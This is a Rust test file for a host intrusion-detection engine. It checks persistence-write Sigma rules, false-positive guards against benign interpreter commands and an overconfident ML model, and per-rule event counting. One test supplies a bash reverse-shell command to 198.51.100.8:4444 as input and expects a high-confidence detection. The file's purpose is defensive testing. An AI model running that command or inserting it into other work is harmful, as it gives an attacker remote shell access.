use crate::{Confidence, DetectionEngine, EventClass, MlModel, TelemetryEvent, TemporalEngine};

fn event(ts: i64, class: EventClass, pid: u32, process: &str, parent: &str) -> TelemetryEvent {
    TelemetryEvent {
        ts_unix: ts,
        event_class: class,
        pid,
        ppid: 10,
        uid: 0,
        process: process.to_string(),
        parent_process: parent.to_string(),
        session_id: 1,
        file_path: None,
        file_write: false,
        file_hash: None,
        dst_port: None,
        dst_ip: None,
        dst_domain: None,
        command_line: None,
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    }
}

// Exercise the real agent seeds without building the agent-core crate.
fn builtin(name: &str) -> &'static str {
    let source = include_str!("../../agent-core/src/lifecycle/detection_bootstrap.rs");
    let marker = format!("const {name}: &str = r#\"");
    source
        .split_once(&marker)
        .unwrap()
        .1
        .split_once("\"#;")
        .unwrap()
        .0
}

#[test]
fn audit_sigma_write_intent_rejects_reads_but_detects_writes() {
    for yaml in [
        builtin("SIGMA_PERSISTENCE"),
        "title: write_only\ndetection:\n  sequence:\n    - event_class: file_open\n      file_path_contains: [/etc/cron]\n      require_file_write: true\n      within_secs: 10\n",
    ] {
        let mut engine = TemporalEngine::new();
        let rule = engine.add_sigma_rule_yaml(yaml).unwrap();
        let exec = event(100, EventClass::ProcessExec, 200, "systemctl", "sh");
        engine.observe(&exec);
        let mut read = event(101, EventClass::FileOpen, 200, "systemctl", "sh");
        read.file_path = Some("/etc/systemd/system/backup.service".to_string());
        if rule == "write_only" {
            read.file_path = Some("/etc/cron.d/backup".to_string());
        }
        assert!(!engine.observe(&read).contains(&rule), "read fired {rule}");
        let mut write = read;
        write.ts_unix = 102;
        write.file_write = true;
        assert!(engine.observe(&write).contains(&rule), "write missed {rule}");
    }
}

#[test]
fn audit_anomaly_and_ml_do_not_make_benign_interpreter_syntax_high() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .layer1
        .load_string_signatures(["python3 -c".to_string()]);
    let mut probe = event(100, EventClass::ProcessExec, 200, "python3", "qemu-ga");
    probe.file_path = Some("/usr/bin/python3.12".to_string());
    probe.command_line = Some("python3 -c 'import string'".to_string());
    for i in 0..512 {
        probe.ts_unix = 100 + i;
        probe.pid = 200 + i as u32;
        let outcome = engine.process_event(&probe);
        assert!(
            outcome.confidence < Confidence::High,
            "default model escalated benign probe {i}: {:?}; signals={:?}; anomaly={:?}; ML={:?}",
            outcome.confidence,
            outcome.signals,
            outcome.anomaly,
            outcome.ml_score
        );
    }

    // The fusion guard must also hold for a server-loaded, overconfident model.
    let mut model = MlModel::default();
    model.weights.fill(0.0);
    model.bias = 5.0; // score=0.993307; intentionally uncalibrated
    engine.layer5.reload_model(model).unwrap();
    for i in 0..128 {
        probe.ts_unix = 1000 + i;
        probe.pid = 1000 + i as u32;
        let outcome = engine.process_event(&probe);
        assert!(
            outcome.confidence < Confidence::High,
            "benign probe escalated: {:?}; signals={:?}; anomaly={:?}; ML={:?}",
            outcome.confidence,
            outcome.signals,
            outcome.anomaly,
            outcome.ml_score
        );
    }
    let mut reverse = event(1200, EventClass::ProcessExec, 2000, "bash", "sshd");
    reverse.command_line = Some("bash -i >& /dev/tcp/198.51.100.8/4444 0>&1".to_string());
    engine.process_event(&reverse);
    let mut connect = event(1201, EventClass::NetworkConnect, 2000, "bash", "sshd");
    connect.dst_port = Some(4444);
    assert!(engine.process_event(&connect).confidence >= Confidence::High);
}

#[test]
fn audit_each_sigma_event_is_observed_once_per_rule() {
    let mut engine = TemporalEngine::new();
    let rule = engine.add_sigma_rule_yaml("title: repeated_exec\ndetection:\n  sequence:\n    - event_class: process_exec\n      process_any_of: [bash]\n      within_secs: 10\n    - event_class: process_exec\n      process_any_of: [bash]\n      within_secs: 10\n").unwrap();
    let first = event(100, EventClass::ProcessExec, 200, "bash", "sh");
    assert!(!engine.observe(&first).contains(&rule));
    let second = event(101, EventClass::ProcessExec, 201, "bash", "bash");
    assert!(engine.observe(&second).contains(&rule));
}
